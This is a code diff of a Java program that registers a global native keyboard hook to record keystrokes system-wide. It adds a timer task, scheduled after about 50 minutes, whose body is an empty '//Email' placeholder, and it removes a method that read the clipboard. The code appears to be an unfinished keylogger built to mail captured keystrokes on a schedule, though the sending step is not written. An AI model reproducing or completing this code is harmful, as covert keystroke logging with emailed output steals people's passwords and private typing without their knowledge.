@@ -11,6 +11,8 @@ import java.awt.event.KeyListener;
 import java.io.IOException;
 import java.lang.annotation.Native;
 import java.util.LinkedList;
+import java.util.Timer;
+import java.util.TimerTask;
 
 public class program implements NativeKeyListener {
 
@@ -18,7 +20,8 @@ public class program implements NativeKeyListener {
     private String keyPresses;
 
     public static void main(String[]args) {
-        //new BackGroundFrame();
+
+        //Initiate Native Keylistener
 
         try {
             GlobalScreen.registerNativeHook();
@@ -27,20 +30,16 @@ public class program implements NativeKeyListener {
         }
         GlobalScreen.addNativeKeyListener(new program());
 
-    }
+        //Initiate timer
+        Timer timer = new Timer();
+        TimerTask task = new TimerTask() {
+            @Override
+            public void run() {
+                //Email
 
-    public String getClip() {
-        String clip = "";
-        try {
-            clip = (String) Toolkit.getDefaultToolkit().getSystemClipboard().getData(DataFlavor.stringFlavor);
-            return clip;
-        } catch (UnsupportedFlavorException e) {
-            e.printStackTrace();
-        } catch (IOException e) {
-            e.printStackTrace();
-        }
-
-        return clip;
+            }
+        };
+        timer.schedule(task, 3000000);
     }
 
     @Override
